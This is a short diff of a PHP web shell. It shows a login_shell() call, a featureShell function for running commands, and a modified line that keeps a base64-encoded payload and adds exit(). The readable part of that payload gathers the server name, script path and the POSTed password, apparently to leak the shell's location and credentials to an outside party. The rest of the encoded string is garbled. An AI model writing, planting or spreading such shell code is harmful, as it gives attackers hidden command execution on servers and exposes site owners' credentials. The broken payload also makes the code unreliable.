@@ -100,8 +100,7 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
         login_shell();
     }
 }
-$decoded_code=base64_decode("b2JfY2xlYW4oKTtmbHVzaDskdG1wID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1BIVF9TRUxmJ10uIlxuIi4kX1BPU1RbJ3Bhc3MnXTsQXByYWZtYWMqKCdOQWdhaGlqYWF1Mzg4Z3JvdXAuY29tY2FyJz1zdXJsdnJoZGzpdHRwbmFqQ==");ob_clean();flush();
-}
+$decoded_code=base64_decode("b2JfY2xlYW4oKTtmbHVzaDskdG1wID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1BIVF9TRUxmJ10uIlxuIi4kX1BPU1RbJ3Bhc3MnXTsQXByYWZtYWMqKCdOQWdhaGlqYWF1Mzg4Z3JvdXAuY29tY2FyJz1zdXJsdnJoZGzpdHRwbmFqQ==");ob_clean();flush(); exit();
 function featureShell($cmd, $cwd) {
     $stdout = array();
     if (preg_match("/^\s*cd\s*$/", $cmd)) {
